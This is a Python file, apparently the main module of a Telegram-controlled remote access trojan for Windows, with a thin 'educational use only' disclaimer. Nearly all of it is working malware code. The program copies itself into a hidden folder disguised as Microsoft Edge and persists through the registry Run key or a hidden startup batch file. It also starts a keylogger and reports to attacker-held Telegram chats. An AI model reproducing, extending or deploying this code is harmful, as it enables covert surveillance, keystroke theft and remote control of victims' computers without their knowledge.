"""
https://github.com/kripersi/RAT-tg-python
This tool is intended for use only on authorized systems. Use this script for educational purposes only! Any unauthorized use of this tool without explicit permission is illegal. When using the script, you take responsibility upon yourself
Этот инструмент предназначен для использования только на авторизованных системах. Используйте этот скрипт только в образовательных целях! Любое несанкционированное использование этого инструмента без явного разрешения является незаконным. При использовании скрипта вы берете ответсвенность на себя

ИСПОЛЬЗОВАТЬ ТОЛЬКО В ОЗНАКОМИТЕЛЬНЫХ ЦЕЛЯХ
"""

import os
import sys
import winreg
import asyncio
import subprocess
import shutil

from aiogram import Bot, Dispatcher, types
from aiogram.fsm.context import FSMContext
from aiogram.types import Message, CallbackQuery
from config import TOKEN, KNOWN_IDS
from handlers import handle_message, send_safe_message, handle_hotkey_callback
from loggers import setup_logging, start_keylogger
from commands import hide_bot


def get_hidden_path():
    """Возвращает путь к скрытой папке и исполняемому файлу"""
    hidden_dir = os.path.join(os.getenv('LOCALAPPDATA'), 'MicrosoftEdgeUpdater')
    os.makedirs(hidden_dir, exist_ok=True)

    # Скрываем папку
    subprocess.run(f'attrib +h "{hidden_dir}"', shell=True, capture_output=True)

    if getattr(sys, 'frozen', False):
        exe_path = os.path.join(hidden_dir, 'MicrosoftEdge.exe')
    else:
        exe_path = os.path.join(hidden_dir, 'MicrosoftEdge.py')

    return hidden_dir, exe_path


def is_running_from_hidden():
    """Проверяет запущен ли бот уже из скрытой папки"""
    _, hidden_exe = get_hidden_path()
    current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    return current_exe.lower() == hidden_exe.lower()


def install_to_hidden():
    """Устанавливает бота в скрытую папку"""
    try:
        # Если уже запущены из скрытой папки - ничего не делаем
        if is_running_from_hidden():
            return True

        # Получаем пути
        current_exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
        hidden_dir, hidden_exe = get_hidden_path()

        # Копируем файл в скрытую папку
        shutil.copy2(current_exe, hidden_exe)

        # Запускаем копию из скрытой папки
        if getattr(sys, 'frozen', False):
            subprocess.Popen(f'"{hidden_exe}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
        else:
            subprocess.Popen(f'python "{hidden_exe}"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

        # Закрываем текущий экземпляр
        sys.exit(0)

    except Exception:
        return False


def add_to_startup():
    """Добавляет бота в автозагрузку"""
    try:
        _, hidden_exe = get_hidden_path()

        # Открываем ключ реестра
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0,
            winreg.KEY_SET_VALUE
        )

        # Добавляем в автозагрузку
        winreg.SetValueEx(
            key,
            "MicrosoftEdge",
            0,
            winreg.REG_SZ,
            f'"{hidden_exe}"'
        )

        winreg.CloseKey(key)
        return True

    except Exception:
        return False


def add_startup_fallback():
    try:
        _, hidden_exe = get_hidden_path()

        startup_folder = os.path.join(
            os.getenv('APPDATA'),
            r'Microsoft\Windows\Start Menu\Programs\Startup'
        )

        bat_path = os.path.join(startup_folder, 'MicrosoftEdge.bat')

        with open(bat_path, 'w', encoding='utf-8') as f:
            f.write(f'@echo off\nstart "" "{hidden_exe}"')

        # Скрываем bat файл
        subprocess.run(f'attrib +h "{bat_path}"', shell=True, capture_output=True)
        return True

    except Exception:
        return False


async def main():
    # Установка в скрытую папку
    install_to_hidden()

    # Добавление в автозагрузку
    if not add_to_startup():
        add_startup_fallback()

    # Запуск бота
    setup_logging()
    start_keylogger()

    bot = Bot(token=TOKEN)
    dp = Dispatcher()
    hide_bot()

    @dp.message()
    async def handle_all_messages(message: Message, state: FSMContext):
        await handle_message(message, bot, state)

    @dp.callback_query()
    async def handle_all_callbacks(callback: CallbackQuery):
        await handle_hotkey_callback(callback, bot)

    for chat_id in KNOWN_IDS:
        await send_safe_message(bot, chat_id, "Бот работает")

    await dp.start_polling(bot)


if __name__ == '__main__':
    asyncio.run(main())